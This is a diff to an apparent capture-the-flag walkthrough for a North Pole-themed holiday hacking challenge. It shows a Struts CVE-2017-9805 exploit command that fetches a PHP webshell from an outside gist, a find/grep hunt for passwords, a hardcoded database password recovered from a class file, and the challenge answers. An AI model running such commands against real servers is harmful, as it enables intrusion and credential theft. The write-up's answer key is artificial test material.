@@ -206,21 +206,48 @@ we can try to use it to execute commands using a browser.
 ./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php" -u https://dev.northpolechristmastown.com/orders.xhtml
 #+END_SRC
 
-Now we can access [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]] and look around. If we do an =ls= in this webshell, it just returns the local directory, =/var/www/html=. Nothing in here suggests that we have the webroot for the dev server, [[https://dev.northpolechristmastown.com]]. 
+Now we can access [[https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php]] and look around. If we do an =ls= in this webshell, it just returns the local directory, =/var/www/html=. Nothing in here suggests that we have the webroot for the dev server, [[https://dev.northpolechristmastown.com]].
+
+Let's run =find= to see if we can find the password in our webshell.
+
+#+BEGIN_SRC sh
+find / -xdev -type f -user alabaster_snowball 2>/dev/null |xargs grep password
+#+END_SRC
+
+Within the page full of results we see this:
+
+#+BEGIN_SRC sh
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
+A closer look at =OrderMySql.class= using =cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class= we find:
+
+#+BEGIN_SRC sh
+            final String username = "alabaster_snowball";
+            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
 
 ** Solution
    :PROPERTIES:
    :CUSTOM_ID: solution
    :END:
 
-Summarize the reference solution that we found
+*** What is the topic of The Great Book page available in the web root of the server?
+
+On the Topic of Flying Animals
+
+*** What is Alabaster Snowball’s password?
+
+=stream_unhappy_buy_loss=
 
 ** Alternatives
    :PROPERTIES:
    :CUSTOM_ID: alternatives
    :END:
 
-Any other, easier solutions?
+* TODO ripgrep
+* TODO SSH key method
 
 ** Common Pitfalls
    :PROPERTIES:
